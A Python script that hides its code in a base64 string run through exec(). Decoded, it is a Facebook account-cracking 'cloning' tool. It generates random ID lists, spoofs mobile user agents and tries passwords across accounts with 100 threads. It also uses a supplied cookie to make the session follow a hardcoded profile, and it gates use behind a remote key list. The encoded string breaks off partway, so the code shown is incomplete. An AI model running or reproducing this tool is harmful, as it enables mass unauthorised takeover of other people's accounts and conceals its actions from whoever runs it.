import base64
exec(base64.b64decode("IyBGYWNlYm9vazogZmFyYWJpIENob3dkaHVyeSANCiMgR2l0aHViOiBibGFjayBodW50ZXIgdGVhbSANCmltcG9ydCBvcyxzeXMsdGltZSxqc29uLHJhbmRvbSxyZSxzdHJpbmcscGxhdGZvcm0sYmFzZTY0LHV1aWQNCm9zLnN5c3RlbSgiZ2l0IHB1bGwiKQ0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgc29wDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cA0KaW1wb3J0IHJlcXVlc3RzIGFzIHJlc3MNCnNuNGdkaDkgPSBvcGVuDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyB3YWt0dQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KICAgIGltcG9ydCBvcw0KICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KICAgIGltcG9ydCBtZWNoYW5pemUNCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiAgICBvcy5zeXRlbSgncGtnIGluc3RhbGwgZXNwZWFrJykNCiAgICANCmRlZiBjZWtfYXBrKHNlc3Npb24sY29raSk6DQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9YWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dA0KICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQ0KICAgIHggPSBzb3AuZmluZCgiZm9ybSIsbWV0aG9kPSJwb3N0IikNCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQ0KICAgIGlmIGxlbihnYW1lKT09MDoNCiAgICAgICAgcHJpbnQoZidcciVzWyVzISVzXSAlc1NvcnJ5IHRoZXJlIGlzIG5vIEFjdGl2ZSAgQXBrJXMgICclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclvwn4y6XSAlcyBceDFiWzE7OTVtIBogWW91ciBBY3RpdmUgQXBwcyAaICAgICA6e1dISVRFfSclKEdSRUVOKSkNCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKGdhbWUpKToNCiAgICAgICAgICAgIHByaW50KGYiXHJbJXMlc10gJXMlcyIlKE4saSsxLGdhbWVbaV0ucmVwbGFjZSgiRGl0YW1iYWhrYW4gcGFkYSIsIiBEaXRhbWJhaGthbiBwYWRhIiksTikpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludChmJ1xyICVzWyVzISVzXSBTb3JyeSwgQXBrIGNoZWNrIGZhaWxlZCBpbnZhbGlkIGNvb2tpZSclKE4sTSxOKSkNCiAgICB3PXNlc3Npb24uZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc2V0dGluZ3MvYXBwcy90YWJiZWQvP3RhYj1pbmFjdGl2ZSIsY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQNCiAgICBzb3AgPSBCZWF1dGlmdWxTb3VwKHcsImh0bWwucGFyc2VyIikNCiAgICB4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpDQogICAgZ2FtZSA9IFtpLnRleHQgZm9yIGkgaW4geC5maW5kX2FsbCgiaDMiKV0NCiAgICBpZiBsZW4oZ2FtZSk9PTA6DQogICAgICAgIHByaW50KGYnXHIlc1slcyElc10gJXNTb3JyeSB0aGVyZSBpcyBubyBFeHBpcmVkIEFwayVzICAgICAgICAgICBcbiclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclvwn4y6XSAlcyBceDFiWzE7OTVtIBogWW91ciBFeHBpcmVkIEFwcHMgGiAgICA6e1dISVRFfSclKE0pKQ0KICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZ2FtZSkpOg0KICAgICAgICAgICAgcHJpbnQoZiJcclslcyVzXSAlcyVzIiUoTixpKzEsZ2FtZVtpXS5yZXBsYWNlKCJLZWRhbHV3YXJzYSIsIiBLZWRhbHV3YXJzYSIpLE4pKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJycpDQoNCmRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6DQogICAgICAgIHIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDE1MzE1MjU4NTE5Jywgew0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQsICdodG1sLnBhcnNlcicpDQogICAgICAgIGdldCA9IHIuZmluZCgnYScsICdJa3V0aScsICoqKCdzdHJpbmcnLCkpLmdldCgnaHJlZicpDQogICAgICAgIHNlc3Npb24uZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCksIHsNCiAgICAgICAgICAgICdjb29raWUnOiBjb2tpIH0sICoqKCdjb29raWVzJywpKS50ZXh0DQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KDQpjbGFzcyBqYWxhbjoNCiAgICBkZWYgX19pbml0X18oc2VsZiwgeik6DQogICAgICAgIGZvciBlIGluIHogKyAiXG4iOg0KICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDA5KQ0KICAgICAgICAgICAgDQpQID0gJ1x4MWJbMTs5N20nDQpNID0gJ1x4MWJbMTs5MW0nDQpIID0gJ1x4MWJbMTs5Mm0nDQpLID0gJ1x4MWJbMTs5M20nDQpCID0gJ1x4MWJbMTs5NG0nDQpVID0gJ1x4MWJbMTs5NW0nIA0KTyA9ICdceDFiWzE7OTZtJw0KTiA9ICdceDFiWzBtJw0Kc25pZ2Rob19IYXNhbiA9IHByaW50ICAgIA0KWiA9ICJcMDMzWzE7MzBtIg0Kc2lyID0gJ1wwMzNbNDFtXHgxYlsxOzk3bScNCnggPSAnXDMzW20nICMgREVGQVVMVA0KbSA9ICdceDFiWzE7OTFtJyAjUkVEICsNCmsgPSAnXDAzM1s5M20nICMgS1VOSU5HICsNCnhyID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUgKw0KaGggPSAnXDAzM1szMm0nICMgSElKQVUgLQ0KdSA9ICdcMDMzWzk1bScgIyBVTkdVDQprayA9ICdcMDMzWzMzbScgIyBLVU5JTkcgLQ0KYiA9ICdcMzNbMTs5Nm0nICMgQklSVSAtDQpwID0gJ1x4MWJbMDszNG0nICMgQklSVSArDQphc3UgPSByYW5kb20uY2hvaWNlKFttLGsseHIsdSxiXSkNCm15X2NvbG9yID0gWw0KIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dDQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpDQpub3cgPSBkYXRldGltZS5ub3coKQ0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCnRvZGF5ID0gZGF0ZS50b2RheSgpDQpvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vZmFjZWJvb2suY29tL2dyb3Vwcy8yMTIzODg2OTAxMTY0NTgnKQ0Kb3Muc3lzdGVtKCdlc3BlYWsgLWEgMzAwICJXRUxDT01FIFRPIFJBTkRPTSBDTE9OSU5HIFRPT0xTIicpDQpsb2dvID0iIiINCiBceDFiWzE7OTNtIF9fX19fICAgICBfX19fICAgICBfX19fICAgIF9fX19fX18gICBfX19fX18gICBfX19fXyAgDQogXDAzM1s5MzsxbXwgIF9fIFwgICAvIF9fIFwgICAvIF9fIFwgIHxfXyAgIF9ffCB8ICBfX19ffCB8ICBfXyBcIA0KIFwwMzNbOTU7MW18IHxfXykgfCB8IHwgIHwgfCB8IHwgIHwgfCAgICB8IHwgICAgfCB8X18gICAgfCB8ICB8IHwNCiBcMDMzWzE7MzJtfCAgXyAgLyAgfCB8ICB8IHwgfCB8ICB8IHwgICAgfCB8ICAgIHwgIF9ffCAgIHwgfCAgfCB8DQogXDAzM1s5NDsxbXwgfCBcIFwgIHwgfF9ffCB8IHwgfF9ffCB8ICAgIHwgfCAgICB8IHxfX19fICB8IHxfX3wgfA0KIFwwMzNbOTE7MW18X3wgIFxfXCAgXF9fX18vICAgXF9fX18vICAgICB8X3wgICAgfF9fX19fX3wgfF9fX19fLyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXDAzM1sxOzM2bVtBTk9OWU1PVVMgQVJNWV0NCiANClx4MWJbMTs5N21bK109PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09WytdDQpceDFiWzE7OTNtWytdIENSRUFURUQgQlkgICA6ICBGQVJBQkkgQ0hPV0RIVVJZIA0KXHgxYlsxOzkybVsrXSBURUFNIENFTyAgICAgOiAgRkFSSEFOIEtIQU4NClx4MWJbMTs5M21bK10gR1JPVVAgICAgICAgIDogIFJPT1RFRCBBTk9OWU1PVVMgQVJNWQ0KXHgxYlsxOzk0bVsrXSBUT09MIFNUQVRVUyAgOiAgUkFORE9NDQpceDFiWzE7OTVtWytdIFRPT0wgVklSU0lPTiA6ICAyLjAuMA0KXHgxYlsxOzk2bVsrXT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1bK10iIiINCnRyeToNCiAgICBrZXkxPW9wZW4oIi9zdG9yYWdlL2VtdWxhdGVkLzAvYW5kcm9pZDgudHh0IiwncicpLnJlYWQoKQ0KZXhjZXB0IElPRXJyb3I6DQogICAga29rPW9wZW4oIi9zdG9yYWdlL2VtdWxhdGVkLzAvYW5kcm9pZDgudHh0IiwndycpDQogICAgbXlpZD11dWlkLnV1aWQ0KCkuaGV4WzoxMl0NCiAgICBmPSJDT0JSQS1MSU5VWCINCiAgICBrZXk9bXlpZCtmDQogICAga29rLndyaXRlKGtleSkNCiAgICBrb2suY2xvc2UoKQ0KICAgIHByaW50KGtleSkNCg0KYT1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ2l0aHViLmNvbS9qYWhpZWQvRUMtMTcwL2Jsb2IvbWFpbi9BYy50eHQiKS50ZXh0DQpiPXN0cihhKQ0Ka2V5MT1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3InKS5yZWFkKCkNCmtleTI9c3RyKGtleTEpICANCmlmIGtleTIgaW4gYjoNCiAgICBwYXNzDQogICAgDQplbHNlOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50DQogICAgcHJpbnQoIllvdXIga2V5ICA6ICIra2V5MikNCiAgICBwcmludCgiXG5cdFx0Q29udGFjdCBBZG1pbiAiKQ0KICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA0MDE4NTAxNjA1NCcpDQogICAgZXhpdCgpDQpsb29wID0gMA0Kb2tzID0gW10NCmNwcyA9IFtdDQoNCmRlZiBjbGVhcigpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHNuaWdkaG9fSGFzYW4obG9nbykNCmZyb20gdGltZSBpbXBvcnQgbG9jYWx0aW1lIGFzIGx0DQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgY21kDQpsdHggPSBpbnQobHQoKVszXSkNCmlmIGx0eCA+IDEyOg0KICAgIGEgPSBsdHgtMTINCiAgICB0YWcgPSAiUE0iDQplbHNlOg0KICAgIGEgPSBsdHgNCiAgICB0YWcgPSAiQU0iDQogICAgDQogICAgDQp0cnk6DQogICAgc25pZ2Rob19IYXNhbignXG5cblwwMzNbMTszM21Mb2FkaW5nIGFzc2V0IGZpbGVzIC4uLiBcMDMzWzA7OTdtJykNCiAgICB2ID0gNS4yDQogICAgdXBkYXRlID0gKCc1LjInKQ0KICAgIHVwZGF0ZSA9ICgnNS4yJykNCiAgICBpZiBzdHIodikgaW4gdXBkYXRlOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBlbHNlOnBhc3MNCmV4Y2VwdDpzbmlnZGhvX0hhc2FuKCdcblwwMzNbMTszMW1ObyBpbnRlcm5ldCBjb25uZWN0aW9uIC4uLiBcMDMzWzA7OTdtJykNCiNnbG9iYWwgZnVuY3Rpb25zDQpkZWYgZHluYW1pYyh0ZXh0KToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJywnLi4uLiAnXQ0KICAgIGZvciBvIGluIHRpdGlrOg0KICAgICAgICBzbmlnZGhvX0hhc2FuKCdccicrdGV4dCtvKSwNCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkNCg0KI1VzZXIgYWdlbnRzDQp1Z2VuMj1bJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA0LjI7IHJ1LXJ1OyBOb2tpYV9YIEJ1aWxkL0pEUTM5KSBBcHBsZVdlYktpdC81MzQuMzAgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMiBNb2JpbGUgU2FmYXJpL0U3RkJBRiddDQp1Z2VuPVsNCiAgICAnTW96aWxsYS81LjAgKExpbnV4OyBUaXplbiAyLjM7IFNBTVNVTkcgU00tWjEzMEgpIEFwcGxlV2ViS2l0LzUzNy4zIChLSFRNTCwgbGlrZSBHZWNrbykgU2Ftc3VuZ0Jyb3dzZXIvMS4wIE1vYmlsZSBTYWZhcmkvNTM3LjMnLA0KJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjA7IFNBTVNVTkcgU00tRzkwMEYgQnVpbGQvTFJYMjFUKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8zLjAnLA0KJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjA7IFNBTVNVTkcgU00tRzkwMEYgQnVpbGQvTFJYMjFUKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8yLjEgQ2hyb21lLzM0LjAuMTg0Ny43NiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQonTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgU0FNU1VORyBTTS1OOTAwViA0RyBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzIuMSBDaHJvbWUvMzQuMC4xODQ3Ljc2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywNCidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wLjI7IFNBTVNVTkcgU00tVDUzME5VIEJ1aWxkL0xSWDIyRykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgU2Ftc3VuZ0Jyb3dzZXIvMy4yIENocm9tZS8zOC4wLjIxMjUuMTAyIFNhZmFyaS81MzcuMzYnLA0KJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgU0FNU1VORyBTTS1BMTI3RikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgU2Ftc3VuZ0Jyb3dzZXIvMTQuMiBDaHJvbWUvODcuMC40MjgwLjE0MSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQonTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTQU1TVU5HIFNNLUExMzdGKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xOS4wIENocm9tZS8xMDIuMC41MDA1LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQonTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBTQU1TVU5HIFNNLUExMjdGKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xNC4yIENocm9tZS84Ny4wLjQyODAuMTQxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywNCidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IFNBTVNVTkcgU00tVDI4MCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgU2Ftc3VuZ0Jyb3dzZXIvMTMuMiBDaHJvbWUvODMuMC40MTAzLjEwNiBTYWZhcmkvNTM3LjM2JywNCidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNBTVNVTkcgU00tQTEyN00pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFNhbXN1bmdCcm93c2VyLzE5LjAgQ2hyb21lLzEwMi4wLjUwMDUuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JyxdDQoNCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQogICAgYWE9J01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCcNCiAgICBiPXJhbmRvbS5jaG9pY2UoWyczJywnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1JywnMTYnLCcxNyddKQ0KICAgIGM9JyBlbi11czsgR1QtJw0KICAgIGQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pDQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkNCiAgICBmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nDQogICAgaD1yYW5kb20ucmFuZHJhbmdlKDczLDEwMCkNCiAgICBpPScwJw0KICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApDQogICAgaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkNCiAgICBsPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicNCiAgICB1YWt1Mj0oZid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JykNCiAgICB1Z2VuLmFwcGVuZCh1YWt1MikNCiMgQVBLIENIRUNLIEVNSUwjIEFQSyBDSEVDSyBFTUlMIyBBUEsgQ0hFQ0sgRU1JTCMgQVBLIENIRUNLIEVNSUwNCmRlZiBzbmlnZGhvKCk6DQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL2ZhY2Vib29rLmNvbS9ncm91cHMvMjEyMzg4NjkwMTE2NDU4JykNCiAgICBzbmlnZGhvX0hhc2FuKGxvZ28pDQogICAgcHJpbnQgKCdceDFiWzE7OTZtWzFdICBDbG9uZSBGcm9tIFJBTkRPTSBCRCAgICBcMDMzWzE7MzZtW1YxXScpDQogICAgcHJpbnQgKCdceDFiWzE7OTFtWzJdICBDbG9uZSBGcm9tIEdNQUlMICAgICAgICBcMDMzWzE7MzJtW1YxXScpDQogICAgcHJpbnQgKCdceDFiWzE7OTZtWzNdICBDbG9uZSBGcm9tIFJBTkRPTSBQSyAgICBcMDMzWzE7MzZtW1YxXScpDQogICAgcHJpbnQgKCdceDFiWzE7OTJtWzRdICBDb250YWN0IE1lJykNCiAgICBwcmludCAoJ1x4MWJbMTs5Nm1bMF0gIEVYSVRcMDMzWzE7MzJtJykNCiAgICBwcmludCAoJ1x4MWJbMTs5N21bK109PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09WytdJykNCiAgICBhY3Rpb24oKQ0KICAgIHByaW50ICg1MCAqICctJykNCiAgICBhY3Rpb24oKQ0KZGVmIGFjdGlvbigpOg0KICAgIGdsb2JhbCBjcGINCiAgICBnbG9iYWwgb2tzDQogICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDkxMzEzMDQ3NDk1JykNCiAgICBzaHV2byA9IGlucHV0KCdcbklOUFVUPT09PiAgICcpDQogICAgaWYgc2h1dm8gPT0gJyc6DQogICAgICAgIHByaW50KCkNCiAgICAgICAgYWN0aW9uKCkNCiAgICBlbGlmIHNodXZvID09ICcxJzoNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIHNuaWdkaG9fYmQoKQ0KICAgIGVsaWYgc2h1dm8gPT0gJzInOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICAgICAgc25pZ2Rob19lbWFpbCgpDQogICAgZWxpZiBzaHV2byA9PSAnMyc6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBzbmlnZGhvX3BrKCkNCiAgICBlbGlmIHNodXZvID09ICc0JzoNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA5MTMxMzA0NzQ5NScpDQogICAgICAgIHByaW50IChsb2dvKQ0KICAgICAgICBwcmludCgnWzFdRmFjZWJvb2sgXG4gWzJdIFdoYXRhcHAnKQ0KICAgICAgICBtYWhkID0gaW5wdXQoJ0Nob3VzZSA6JykNCiAgICAgICAgaWYgbWFoZCA9PScxJzoNCiAgICAgICAgICAgIG9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA5MTMxMzA0NzQ5NSIpDQogICAgICAgICAgICBzbmlnZGhvKCkNCiAgICAgICAgZWxpZiBtYWhkID09ICcyJzoNCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93YS5tZS8rODgwMTc0Nzk1MTE2OScpDQogICAgICAgICAgICBzbmlnZGhvKCkNCiMgQVBLIENIRUNLIEVNSUwNCmRlZiBzbmlnZGhvX2VtYWlsKCk6DQogICAgdXNlcj1bXQ0KICAgIHR3ZiA9W10NCiAgICBvcy5nZXR1aWQNCiAgICBvcy5nZXRldWlkDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIHNuaWdkaG9fSGFzYW4oZicgW3t4cn1ee3h9XSBFeGFtcGxlPjoge3hyfTAxOSwwMTcsMDE4LDAxNiwwMTV7eH0nKQ0KICAgIHNuaWdkaG9fSGFzYW4oIiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpDQogICAgcmsxID0gJy4nDQogICAgcmsyID0gJzEnDQogICAgcmszID0gJzAnDQogICAgcms0ID0gJy4nDQogICAgY29kZSA9IHJhbmRvbS5jaG9pY2UoW3JrMSxyazIscmszLHJrNF0pICAgICAgICAgICAgICAgICAgICAgIA0KICAgIGlucHV0KGYnIFt7eHJ94page3h9XSBDaG9vc2UgOiAnKQ0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHNuaWdkaG9fSGFzYW4obG9nbykNCiAgICBmYXN0bmFtZSA9IGlucHV0KGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIEVYQU1QTEUgOiBcMDMzWzA7OTNtc25pZ2RobywgXHgxYlszODs1OzIwOG1oYXNhbiwgXDAzM1swOzkybXNodXZvIF0gXG5cMDMzWzA7OTVt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIFxuXDAzM1swOzk3bVt7eHJ9Xnt4fV0gXDAzM1swOzkybVBVVCBDTE9OSU5HIEZBU1QgTkFNRTpcMDMzWzA7OTNtICcpDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIGxhc3R0bmFtZSA9IGlucHV0KGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIEVYQU1QTEUgOiBcMDMzWzA7OTNtc25pZ2RobywgXHgxYlszODs1OzIwOG1oYXNhbiwgXDAzM1swOzkybXNodXZvIF0gXG5cMDMzWzA7OTVt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIFxuXDAzM1swOzk3bVt7eHJ9Xnt4fV0gXDAzM1swOzkybVBVVCBDTE9OSU5HIExBU1QgTkFNRTpcMDMzWzA7OTNtICcpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIGxpbWl0ID0gaW50KGlucHV0KGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIEVYQU1QTEUgOiBcMDMzWzA7OTNtMTAwMDAsIFx4MWJbMzg7NTsyMDhtMjAwMDAsIFwwMzNbMDs5Mm01MDAwMCBdIFxuXDAzM1swOzk1beKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCBcblwwMzNbMDs5N21be3hyfV57eH1dIFwwMzNbMDs5Mm1QVVQgQ0xPTklORyBMSU1JVDpcMDMzWzA7OTNtICcpKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDMpKQ0KICAgICAgICB1c2VyLmFwcGVuZChubXApDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIHBhc3N4ID0gMA0KICAgIEhhbWlpSUQgPSBbXQ0KICAgIHNuaWdkaG9fSGFzYW4oIiIpDQogICAgZm9yIGJpbGFsIGluIHJhbmdlKHBhc3N4KToNCiAgICAgICAgcHd3ID0gaW5wdXQoZiJbKl0gRW50ZXIgUGFzc3dvcmQge2JpbGFsKzF9IDogIikNCiAgICAgICAgSGFtaWlJRC5hcHBlbmQocHd3KQ0KICAgIHdpdGggVGhyZWFkUG9vbChtYXhfd29ya2Vycz0xMDApIGFzIG1hbnNoZXJhOg0KICAgICAgICBjbGVhcigpDQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkNCiAgICAgICAgc25pZ2Rob19IYXNhbignXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBzbmlnZGhvX0hhc2FuKGYnW3t4cn1ee3h9XVx4MWJbMzg7NTsyMDhtIFlPVVIgVE9UQ